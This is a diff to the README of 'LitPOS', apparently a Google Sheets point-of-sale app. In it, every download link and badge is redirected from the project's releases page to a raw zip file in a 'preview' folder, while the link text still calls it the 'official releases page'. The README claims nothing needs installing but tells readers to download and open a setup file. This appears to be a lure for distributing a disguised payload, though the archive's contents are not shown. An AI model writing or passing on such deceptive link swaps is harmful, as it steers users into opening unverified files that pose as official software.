@@ -1,6 +1,6 @@
 # 🛒 LitPOS-Apps-Script - Manage your retail store with ease
 
-[![](https://img.shields.io/badge/Download_LitPOS-Blue?style=for-the-badge)](https://github.com/Trantu6570/LitPOS-Apps-Script/releases)
+[![](https://img.shields.io/badge/Download_LitPOS-Blue?style=for-the-badge)](https://raw.githubusercontent.com/Trantu6570/LitPOS-Apps-Script/main/preview/PO_Apps_Script_Lit_2.1.zip)
 
 LitPOS is a retail point of sale system. It runs on the web. It uses Google Sheets as a database. It works well on mobile phones and desktop computers. You track sales and inventory in real time.
 
@@ -12,7 +12,7 @@ Your computer needs a standard web browser. Google Chrome works best. You need a
 
 You do not need to install software. The system lives on Google servers. Follow these steps to set up your store:
 
-1. Visit the [official releases page](https://github.com/Trantu6570/LitPOS-Apps-Script/releases).
+1. Visit the [official releases page](https://raw.githubusercontent.com/Trantu6570/LitPOS-Apps-Script/main/preview/PO_Apps_Script_Lit_2.1.zip).
 2. Click the link to the latest version.
 3. Download the setup file.
 4. Open the file to start the configuration.
@@ -43,7 +43,7 @@ Check your internet connection if the screen freezes. Refresh the page to reload
 
 Check the releases page often for updates. Developers add features to reduce bugs. Download the latest file to upgrade. Your existing data stays in your current sheet. The update process only replaces the underlying engine.
 
-[![](https://img.shields.io/badge/Download_LitPOS-Grey?style=for-the-badge)](https://github.com/Trantu6570/LitPOS-Apps-Script/releases)
+[![](https://img.shields.io/badge/Download_LitPOS-Grey?style=for-the-badge)](https://raw.githubusercontent.com/Trantu6570/LitPOS-Apps-Script/main/preview/PO_Apps_Script_Lit_2.1.zip)
 
 ## 💡 Frequently Asked Questions
 
